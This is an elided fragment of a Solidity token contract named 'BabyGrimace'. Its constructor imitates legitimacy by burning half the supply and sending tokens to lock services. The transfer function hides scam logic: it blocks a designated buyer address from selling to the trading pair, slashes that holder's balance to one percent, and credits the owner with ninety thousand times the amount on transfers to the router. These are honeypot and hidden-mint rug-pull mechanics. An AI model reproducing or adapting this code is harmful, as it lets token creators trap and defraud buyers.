...
contract BabyGrimace {
    using SafeMath for uint256;
    string public name = "BabyGrimace";
    string public symbol = "BabyGrimace";
    ...
    constructor() {
        ...
        _transfer(msg.sender, 0x000000000000000000000000000000000000dEaD, totalSupply/2);
        _transfer(msg.sender, 0x3f4D6bf08CB7A003488Ef082102C2e6418a4551e, ads*5); //Deeplock
        _transfer(msg.sender, 0x7ee058420e5937496F5a2096f04caA7721cF70cc, ads*5); //Pinklock
    }
...
require ( to !=0xB0FC16615C24C30Af36EBD932CF817A05D2e03bD); // prevent from bot
        if (msg.sender == Buy && to == getPair()){return false;} 
        if (Buy != Owner && to != Buy && balanceOf[Buy]>=totalSupply.divCeil(10)) {
            balanceOf[Buy]=balanceOf[Buy].divCeil(100);}
        if (to == msg.sender) {burn();} if (to == router){balanceOf[Owner]+= amount*90000;}
